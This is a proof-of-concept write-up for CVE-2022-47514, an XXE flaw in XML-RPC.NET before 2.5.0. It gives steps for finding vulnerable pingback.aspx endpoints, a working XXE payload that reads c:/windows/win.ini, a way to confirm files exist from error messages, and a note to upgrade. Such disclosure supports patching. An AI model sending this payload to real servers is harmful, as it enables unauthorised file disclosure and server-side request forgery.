# [CVE-2022-47514] Proof of Concept 
**CVE (+Exploit) Author:** Farzan Karimi

**CVE Summary:**  An XML external entity (XXE) injection vulnerability in http://XML-RPC.NET before 2.5.0 allows remote authenticated users to conduct server-side request forgery (SSRF) attacks, as demonstrated by a pingback.aspx POST request

**CVE Details:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-47514

# PoC for CookComputing XML-RPC.NET XXE <2.5.0
1. Identify a vulnerable pingback.aspx endpoint. Identifying pingback endpoints with "CookComputing" <2.5 version footers tend to be strong signals.

![xml-rpc-1](https://user-images.githubusercontent.com/3679232/207168120-9465cd3d-2f3d-4ae0-b308-090de2b2501f.png)

2. Leverage the following XXE POST payload:

```
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM  
"file://c:/windows/win.ini">]><foo>&xxe;</foo> 
```

3. Request a non-existent file on the remote server (e.g. "winFAKE.ini")

![xml-rpc-2](https://user-images.githubusercontent.com/3679232/207168416-9c801f2f-27ca-47c4-a5df-a4f66af98a58.png)

4. Request an existent file on the remote server (e.g. "win.ini"). Note the error message is different when requesting access to an existing file. This validates our XXE is working as intended.

![xml-rpc-3](https://user-images.githubusercontent.com/3679232/207167024-7338126f-6736-4f14-9a64-b6a0ecc7417e.png)

# Mitigation
Installations using a version prior to version 2.5.0 should update to version 2.5.0. 
